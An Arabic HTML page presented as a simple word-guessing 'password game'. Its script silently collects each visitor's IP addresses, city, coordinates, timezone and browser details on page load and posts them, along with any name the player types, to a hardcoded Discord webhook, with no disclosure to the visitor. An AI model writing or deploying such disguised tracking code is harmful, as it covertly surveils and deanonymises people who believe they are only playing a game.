<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>لعبة كلمة السر</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      direction: rtl;
      text-align: center;
      margin: 50px;
    }
    input, button {
      padding: 10px;
      margin: 10px 0;
      width: 250px;
      font-size: 16px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>لعبة كلمة السر</h1>

  <input type="text" id="playerName" placeholder="اكتب اسمك (اختياري)" autocomplete="off" />
  <br/>
  <input type="text" id="userInput" placeholder="اكتب الكلمة هنا" autocomplete="off" />
  <br/>
  <button id="verify-button">تحقق من الكلمة</button>

  <div id="result"></div>

  <script>
    const discordWebhookUrl = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
    const correctWord = "السر";

    async function getIPInfo() {
      try {
        const [ipv4Res, ipv6Res] = await Promise.all([
          fetch("https://api.ipify.org?format=json").then(res => res.json()),
          fetch("https://api64.ipify.org?format=json").then(res => res.json())
        ]);

        const ipv4 = ipv4Res.ip;
        const ipv6 = ipv6Res.ip;

        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
        const geoData = await geoRes.json();

        const userAgent = navigator.userAgent;

        const info = `
IPv4: ${ipv4}
IPv6: ${ipv6}
الدولة: ${geoData.country_name}
المنطقة: ${geoData.region}
المدينة: ${geoData.city}
الموقع: ${geoData.latitude}, ${geoData.longitude}
المنطقة الزمنية: ${geoData.timezone}
المتصفح والجهاز: ${userAgent}
        `.trim();

        return info;

      } catch (err) {
        return "فشل في جلب معلومات IP";
      }
    }

    async function sendToWebhook(message) {
      try {
        await fetch(discordWebhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message }),
        });
      } catch (err) {
        console.error("فشل الإرسال إلى الويب هوك", err);
      }
    }

    async function sendUserInfoOnLoad() {
      const info = await getIPInfo();
      sendToWebhook(info);
    }

    window.addEventListener("load", () => {
      sendUserInfoOnLoad();
    });

    document.getElementById("verify-button").addEventListener("click", () => {
      const playerName = document.getElementById("playerName").value.trim();
      const userWord = document.getElementById("userInput").value.trim();
      const resultDiv = document.getElementById("result");

      if (playerName) sendToWebhook(`اسم اللاعب: ${playerName}`);

      if (!userWord) {
        resultDiv.textContent = "الرجاء إدخال كلمة.";
        return;
      }

      if (userWord === correctWord) {
        resultDiv.textContent = "مبروك! الكلمة صحيحة.";
      } else {
        resultDiv.textContent = "الكلمة غير صحيحة.";
      }
    });
  </script>

</body>
</html>
